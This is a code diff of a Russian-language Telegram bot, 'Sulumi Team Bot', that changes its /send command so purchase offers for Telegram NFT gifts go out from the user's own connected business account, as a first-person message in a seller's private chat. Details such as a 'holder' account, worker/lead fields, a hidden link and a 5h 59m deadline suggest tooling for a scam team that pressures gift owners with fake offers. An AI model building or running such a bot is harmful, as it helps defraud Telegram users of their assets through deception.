@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Final Render Version
+Sulumi Team Bot — P2P Direct Message Version
 """
 
 import os
@@ -45,7 +45,6 @@ users = {}
 bconns = {}
 allowed = [OWNER_ID]
 wholder = set()
-awgrant = {}
 rlog = deque()
 rwait = 0
 
@@ -82,9 +81,6 @@ def gs(uid):
     if uid not in users:
         users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
     return users[uid]
-
-def get_owner_bci():
-    return bconns.get(OWNER_ID)
 
 def sm(cid, txt, kb=None, bci=None):
     d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
@@ -190,11 +186,9 @@ def handle_message(msg):
 
     if ci:
         bconns[uid] = ci
-        print(f"💾 Saved bci for user {uid}: {ci}")
 
     txt = (msg.get("text") or "").strip()
 
-    # ПРОВЕРКА WHOLDER ДО проверки на /
     if uid in wholder:
         un = txt.lstrip("@").lower()
         if un and " " not in un:
@@ -214,8 +208,11 @@ def handle_message(msg):
     if txt == "/start":
         cmd_text = f"""✨ <b>Sulumi Team Bot</b>
 
+📋 <b>Как купить:</b>
+1. Зайди в ЛС к продавцу
+2. Напиши: <code>/send ссылка цена</code>
+
 📋 <b>Команды:</b>
-/send — Создать оффер
 /settings — Настройки
 /profile — Профиль
 /stats — Статистика
@@ -227,22 +224,17 @@ def handle_message(msg):
 
     if txt.startswith("/send"):
         parts = txt.split()
-        if len(parts) < 4:
-            sm(cid, "❌ <b>Формат:</b>\n<code>/send ID ссылка цена</code>\n\nПример:\n<code>/send 123456789 https://t.me/nft/JellyBunny-98909 22000</code>", bci=ci)
+        # Новый формат: /send ссылка цена (без ID, так как пишем в лс продавцу)
+        if len(parts) < 3:
+            sm(cid, "❌ <b>Формат:</b>\n<code>/send ссылка цена</code>\n\nПиши эту команду прямо в ЛС продавцу!\nПример:\n<code>/send https://t.me/nft/JellyBunny-98909 22000</code>", bci=ci)
             return
 
-        try:
-            tid = int(parts[1])
-        except:
-            sm(cid, "❌ ID должен быть числом", bci=ci)
-            return
-
-        ni = pnft(" ".join(parts[2:]))
+        ni = pnft(" ".join(parts[1:]))
         if not ni:
             sm(cid, "❌ Не найдена ссылка на NFT", bci=ci)
             return
 
-        rest = " ".join(parts[2:]).replace("https://t.me/nft/" + ni["slug"], "").replace("t.me/nft/" + ni["slug"], "").strip()
+        rest = " ".join(parts[1:]).replace("https://t.me/nft/" + ni["slug"], "").replace("t.me/nft/" + ni["slug"], "").strip()
         ps = rest.split()
         pr = None
         if ps:
@@ -257,33 +249,35 @@ def handle_message(msg):
         cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
         did = str(uuid.uuid4())[:8]
         
-        owner_bci = get_owner_bci()
-        if not owner_bci:
-            sm(cid, "⚠️ <b>Владелец не подключил бизнес-аккаунт!</b>", bci=ci)
+        # Используем BCI ПОКУПАТЕЛЯ (того, кто пишет команду), а не владельца!
+        buyer_bci = ci or bconns.get(uid)
+        if not buyer_bci:
+            sm(cid, "⚠️ <b>Ты не подключил бизнес-аккаунт к боту!</b>\n\nПодключи через @BotFather → Business → Connect Business Account, чтобы бот мог писать от твоего имени.", bci=ci)
             return
 
         deals[did] = {
-            "wid": uid, "lid": tid, "slug": ni["slug"], "name": ni["name"],
+            "wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"],
             "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], 
-            "st": "pending", "bci": owner_bci
+            "st": "pending", "bci": buyer_bci
         }
 
-        on = goname(msg)
         nl = "https://t.me/nft/" + ni["slug"]
 
         hidden = '<a href="' + nl + '">\u200b</a>'
-        caption = hidden + f"Пользователь <u>{on}</u> предлагает <b>{pr}</b> {cs}\nза ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
+        # Текст от первого лица, так как сообщение летит от лица покупателя
+        caption = hidden + f"Предлагаю <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
 
-        result = sm_nft(tid, caption, nl, kb=okb(did), bci=owner_bci)
+        # Отправляем в тот же чат (cid), откуда пришла команда
+        result = sm_nft(cid, caption, nl, kb=okb(did), bci=buyer_bci)
         
         if result.get("ok"):
-            sm(cid, f"✅ Оффер отправлен. Holder: @{s['hold']}", bci=ci)
+            pass # Сообщение и так видно в чате, не спамим
         else:
-            err = result.get("description", "err")
-            if "bot was blocked" in err.lower():
-                sm(cid, "❌ Пользователь заблокировал бота", bci=ci)
+            err = result.get("description", "err").lower()
+            if "business_peer_usage_missing" in err:
+                sm(cid, "❌ Ошибка: бот не может писать в этот чат. Убедись, что ты пишешь команду в ЛС продавцу.", bci=ci)
             else:
-                sm(cid, f"❌ Ошибка: {err}", bci=ci)
+                sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
         return
 
     if txt == "/settings":
@@ -308,7 +302,7 @@ def handle_message(msg):
         return
 
     if txt == "/help":
-        sm(cid, "❓ <b>Помощь</b>\n\n/send ID ссылка цена\nПример: /send 123456789 https://t.me/nft/JellyBunny-98909 22000", bci=ci)
+        sm(cid, "❓ <b>Помощь</b>\n\nЗайди в ЛС к продавцу и напиши:\n<code>/send ссылка цена</code>\nПример: /send https://t.me/nft/JellyBunny-98909 22000", bci=ci)
         return
 
     if txt.startswith("/give"):
@@ -384,7 +378,7 @@ def handle_callback(cb):
     cid = msg.get("chat", {}).get("id", uid)
     mid = msg.get("message_id", 0)
     data = cb.get("data", "")
-    ci = msg.get("business_connection_id") or get_owner_bci()
+    ci = msg.get("business_connection_id")
 
     if data.startswith("check:"):
         ac(cbid, txt="🔍 Подарок пока не найден.", sa=True)
@@ -448,7 +442,6 @@ def webhook():
         elif "business_connection" in update:
             bc = update["business_connection"]
             bconns[bc["user"]["id"]] = bc["id"]
-            print(f"✅ Business connection: {bc['user']['id']} -> {bc['id']}")
     except Exception as e:
         print("Webhook error:", e)
     return jsonify({"ok": True})
@@ -468,7 +461,7 @@ def set_webhook():
 def set_commands():
     commands = [
         {"command": "start", "description": "📋 Меню команд"},
-        {"command": "send", "description": "💎 Создать оффер"},
+        {"command": "send", "description": "💎 Создать оффер (в ЛС)"},
         {"command": "settings", "description": "⚙️ Настройки"},
         {"command": "profile", "description": "👤 Профиль"},
         {"command": "stats", "description": "📊 Статистика"},
